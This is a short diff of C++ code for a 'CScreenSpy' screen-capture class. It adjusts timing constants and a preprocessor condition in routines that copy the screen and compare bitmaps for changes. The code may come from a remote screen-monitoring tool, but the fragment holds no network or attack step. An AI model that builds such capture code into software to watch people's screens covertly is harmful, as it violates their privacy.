@@ -208,8 +208,8 @@ VOID CScreenSpy::WriteRectBuffer(LPBYTE	szBuffer,ULONG ulLength)
 
 VOID CScreenSpy::ScanScreen(HDC hdcDest, HDC hdcSour, ULONG ulWidth, ULONG ulHeight)
 {
-	AUTO_TICK(1);
-#ifdef COPY_ALL
+	AUTO_TICK(70);
+#if COPY_ALL
 	BitBlt(hdcDest, 0, 0, ulWidth, ulHeight, hdcSour, 0, 0, m_dwBitBltRop);
 #else
 	const ULONG	ulJumpLine = 50;
@@ -233,7 +233,7 @@ VOID CScreenSpy::ScanScreen(HDC hdcDest, HDC hdcSour, ULONG ulWidth, ULONG ulHei
 ULONG CScreenSpy::CompareBitmap(LPBYTE CompareSourData, LPBYTE CompareDestData, 
 								LPBYTE szBuffer, DWORD ulCompareLength)
 {
-	AUTO_TICK(1);
+	AUTO_TICK(20);
 	// Windows规定一个扫描行所占的字节数必须是4的倍数, 所以用DWORD比较
 	LPDWORD	p1 = (LPDWORD)CompareDestData, p2 = (LPDWORD)CompareSourData;
 	// 偏移的偏移，不同长度的偏移
